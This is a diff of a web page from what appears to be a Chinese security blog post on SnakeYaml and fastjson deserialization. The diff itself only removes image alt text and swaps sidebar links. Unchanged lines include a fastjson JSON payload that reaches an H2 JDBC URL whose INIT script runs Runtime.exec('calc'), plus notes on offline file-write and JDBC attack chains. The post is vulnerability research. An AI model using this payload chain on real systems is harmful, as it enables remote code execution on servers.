@@ -638,9 +638,9 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">boolean: </span><br><span class="line">    - TRUE  #true,True都可以</span><br><span class="line">    - FALSE  #false，False都可以</span><br><span class="line">float:</span><br><span class="line">    - 3.14</span><br><span class="line">    - 6.8523015e+5  #可以使用科学计数法</span><br><span class="line">int:</span><br><span class="line">    - 123</span><br><span class="line">    - 0b1010_0111_0100_1010_1110    #二进制表示</span><br><span class="line">null:</span><br><span class="line">    nodeName: &#x27;node&#x27;</span><br><span class="line">    parent: ~  #使用~表示null</span><br><span class="line">string:</span><br><span class="line">    - 哈哈</span><br><span class="line">    - &#x27;Hello world&#x27;  #可以使用双引号或者单引号包裹特殊字符</span><br><span class="line">    - newline</span><br><span class="line">      newline2    #字符串可以拆成多行，每一行会被转化成一个空格</span><br><span class="line">date:</span><br><span class="line">    - 2022-07-28    #日期必须使用ISO 8601格式，即yyyy-MM-dd</span><br><span class="line">datetime: </span><br><span class="line">    -  2022-07-28T15:02:31+08:00    #时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span><br></pre></td></tr></table></figure>
 
 <p><code>-</code>的作用：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161408050.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161408050.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250417161408050"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161422499.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161422499.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250417161422499"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161428690.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161428690.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250417161428690"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161408050.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161408050.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161422499.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161422499.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161428690.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417161428690.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h1 id="SnakeYaml反序列化"><a href="#SnakeYaml反序列化" class="headerlink" title="SnakeYaml反序列化"></a>SnakeYaml反序列化</h1><p>1.x全版本可利用，snakeYaml&lt;2.0</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -761,13 +761,13 @@
 
 <h2 id="不出网MarshalOutputStream写文件"><a href="#不出网MarshalOutputStream写文件" class="headerlink" title="不出网MarshalOutputStream写文件"></a>不出网MarshalOutputStream写文件</h2><p>snakeYaml和fastjson很像，可以借鉴一下fastjson的payload</p>
 <p>phith0n师傅做了一张图，copy一下</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415182117465.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415182117465.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250415182117465"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415182117465.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415182117465.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>不出网的情况下，fastjson有一条1.2.68+commons-io写文件的链子。在分析这条链子的时候提到OpenJDK&gt;&#x3D;11能无需commons-io依赖直接写文件的MarshalOutputStream POC</p>
 <p><a href="https://godownio.github.io/2024/10/28/fastjson-1.2.68-commons-io-xie-wen-jian/">https://godownio.github.io/2024/10/28/fastjson-1.2.68-commons-io-xie-wen-jian/</a></p>
 <p>之所以在fastjson中MarshalOutputStream写文件的链子会比较局限</p>
 <p>fastjson在找不到默认无参构造函数的情况下，会遍历所有构造函数，使用lookupParametersName寻找带参数名信息的构造函数</p>
 <p><a target="_blank" rel="noopener" href="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163356883.png"><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163356883.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163356883.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></a></p>
-<p><a target="_blank" rel="noopener" href="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png"><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png"><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></a></p>
 <p>缺失了LocalVeriableTable并不会影响类的正常使用和反射调用，但是会使调试出现问题，无法提供方法中局部变量的名称、类型和作用范围等信息。</p>
 <p>ASMUtils.lookupParametersName 方法依赖于 LocalVariableTable 信息来查找方法参数的名称。</p>
 <p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/263503452">https://zhuanlan.zhihu.com/p/263503452</a></p>
@@ -795,7 +795,7 @@
 <h2 id="不出网H2-JDBC"><a href="#不出网H2-JDBC" class="headerlink" title="不出网H2 JDBC"></a>不出网H2 JDBC</h2><p>update at 2025.4.15 phith0n大师傅对HertzBeat中SnakeYaml反序列化不出网的拓展。详情请直接移步<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html">https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html</a></p>
 <p>jdk&gt;&#x3D;11，有h2database的情况下，能打h2 JDBC Attack</p>
 <p>fastjson&gt;&#x3D;1.2.36可以通过$ref调用getter，如果目标有h2database的依赖，可以通过调用org.h2.jdbcx.JdbcDataSource#getConnection打h2database的jdbc attack</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417122145100.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417122145100.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250417122145100"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417122145100.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417122145100.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.h2.jdbcx.JdbcDataSource&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.h2.jdbcx.JdbcDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS &#x27;void exec() throws java.io.IOException &#123; Runtime.getRuntime().exec(\&quot;calc\&quot;)\\; &#125;&#x27;\\;CALL EXEC ()\\;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$[1].connection&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
 
 <blockquote>
@@ -815,7 +815,7 @@
 <p>网上有一些文章说JDBC的INIT中不支持执行多个SQL语句，其实原因就是没有转义分号导致的，实际上这里并没有限制。</p>
 </blockquote>
 <p>其实JdbcConnection构造函数的第二个参数是Properties，我们完全可以将INIT这种属性放到这里面。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417155614271.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417155614271.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250417155614271"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417155614271.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417155614271.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>以减少URL参数中的转义，然后将YAML修改成我们更熟悉的样式：</p>
 <blockquote>
 <p>YAML 中的 <code>|</code> 是一种 <strong>多行文本（Literal Block Scalar）标记符</strong>，用于保留换行并原样呈现多行字符串的内容</p>
@@ -1170,6 +1170,27 @@ fastjson 1.2.68在之前版本1.2.47 版本漏洞爆发之后，官方在
             
 
             <div class="post-img-box">
+              <a href="/2026/10/18/yi-xie-qi-guai-de-zi-shi-he-chang-jing-za-hui/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8197.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8197.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">10-18</span>
+                
+              </div>
+              <a class="post-title" href="/2026/10/18/yi-xie-qi-guai-de-zi-shi-he-chang-jing-za-hui/">一些奇怪的姿势和场景杂烩</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
               <a href="/2026/05/01/rhino-fan-xu-lie-hua/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
                 <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8196.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8196.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
@@ -1245,27 +1266,6 @@ fastjson 1.2.68在之前版本1.2.47 版本漏洞爆发之后，官方在
                 
               </div>
               <a class="post-title" href="/2026/03/19/alictf-2025-web-java/">Alictf 2026 javaweb</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2026/03/13/wo-de-an-quan-mian-shi-just-shi-xi/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8192.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8192.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">03-13</span>
-                
-              </div>
-              <a class="post-title" href="/2026/03/13/wo-de-an-quan-mian-shi-just-shi-xi/">我的安全面试——实习</a>
             </div>
           </div>
         
